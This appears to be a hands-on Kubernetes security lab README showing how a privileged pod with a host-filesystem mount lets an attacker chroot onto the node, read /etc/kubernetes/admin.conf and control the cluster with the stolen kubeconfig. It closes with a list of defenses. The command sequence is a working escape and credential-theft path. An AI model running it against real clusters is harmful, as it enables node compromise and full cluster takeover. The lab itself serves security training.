⎈ Container Escape to Host System – Hands-On Lab
🙌 Overview

This lab demonstrates one of the most dangerous but commonly seen Kubernetes security failures: privileged containers with host access.
When containers are granted permissions beyond what they require, they can escape their isolation boundary and gain control over the host node and eventually the entire cluster.

In this scenario, you will:

Escape from a container to the host filesystem

Gain node-level privileges

Access Kubernetes administrative configuration

Use it to interact with the cluster with elevated privileges

🎯 Learning Objectives

By the end of this lab, you will be able to:

Exploit a misconfigured privileged container

Escape container isolation using host mounts

Access the host node filesystem

Obtain Kubernetes kubeconfig from the node

Query and control Kubernetes using stolen credentials

Understand the real-world security impact

⚡️ Scenario

Monitoring, debugging, and system-level tooling sometimes requires elevated privileges.
However, when such workloads are deployed insecurely (privileged + host mounts), they expose the host system and the cluster.

In this lab you will:
1️⃣ Exploit a privileged pod
2️⃣ Break into the host filesystem
3️⃣ Access node kubeconfig
4️⃣ Control the cluster

🎯 Lab Goal

Escape out of the running container

Gain access to the host system

Obtain kubeconfig from:

/etc/kubernetes/admin.conf


Use it to query and control the cluster

🧪 Step-By-Step Walkthrough
1️⃣ Identify Privileges

Check container capabilities and privileges:

capsh --print

mount

<img width="934" height="308" alt="image" src="https://github.com/user-attachments/assets/a5fb8456-16c4-4a15-a0d1-185ba44bd97d" />
<img width="945" height="380" alt="image" src="https://github.com/user-attachments/assets/946f6ab0-ab9f-4960-9194-57949eb2fc9f" />
<img width="937" height="304" alt="image" src="https://github.com/user-attachments/assets/3c1d9208-3bc4-4cfb-b3cd-0ee9bcb2f17e" />


2️⃣ Verify Host Filesystem is Mounted

List the mounted host filesystem:

ls /host-system/
<img width="875" height="51" alt="image" src="https://github.com/user-attachments/assets/682f9060-12fb-446f-b302-265ec0e252ea" />


If you see directories like /bin, /etc, /var, /lib, /root,
this means the node filesystem is mounted inside the pod 🔥

3️⃣ Escape Into Host Filesystem

Use chroot to switch root filesystem to host:

chroot /host-system bash


Now your shell root / is the node filesystem.

Verify:

whoami
hostname
ls /


You are still inside the pod namespaces,
but now you control the node disk — which is already a critical compromise.

<img width="784" height="71" alt="image" src="https://github.com/user-attachments/assets/e69b28ce-1c7d-4225-a525-6f694c2636f7" />



4️⃣ Inspect Running Pods From the Host Runtime
crictl pods


This confirms visibility into node runtime workloads.

5️⃣ Access Kubernetes Admin Credentials

On most Kubernetes clusters, node admin credentials exist here:

cat /etc/kubernetes/admin.conf

<img width="934" height="368" alt="image" src="https://github.com/user-attachments/assets/8f995dd3-5d48-4abc-b7fd-c2d69eaaf0ff" />

This file gives HIGH privilege access.

6️⃣ Use kubeconfig to Control Cluster

List cluster system resources:

kubectl --kubeconfig /etc/kubernetes/admin.conf get all -n kube-system
<img width="913" height="348" alt="image" src="https://github.com/user-attachments/assets/c0b06a32-f25b-48dd-8a41-5c30b8a4e0e2" />


List nodes:

kubectl --kubeconfig /etc/kubernetes/admin.conf get nodes
<img width="802" height="58" alt="image" src="https://github.com/user-attachments/assets/8ff03c90-0c9b-4cef-95f6-d140b354720b" />


🎉 Congratulations — you now have cluster-level control using credentials stolen from the node.

This is a realistic adversary path:
Container Escape → Host Filesystem → Steal admin.conf → Full Cluster Control

From here, lateral movement and post-exploitation becomes possible depending on environment.

🧠 What You Just Proved

Privileged containers + host mounts = 🚨 critical risk

Container escape does NOT always require kernel exploits

Host access → Kubernetes control plane access

Real-world attackers abuse this exact path

🔐 Key Defenses

To prevent this class of attack:

❌ Avoid privileged pods

❌ Do not mount / or sensitive host paths

❌ Avoid hostPID / hostNetwork / hostIPC unless absolutely required

✔ Enforce Pod Security Admission or OPA

✔ Use runtime security tools (Falco, eBPF, Defender, etc.)

✔ Monitor for hostPath usage

✔ Separate control-plane and workload nodes

✔ Rotate kubeconfig credentials

🔖 References

Misuse of Linux capabilities in containers

Privileged vs unprivileged container exploitation

Hardening Linux container environments
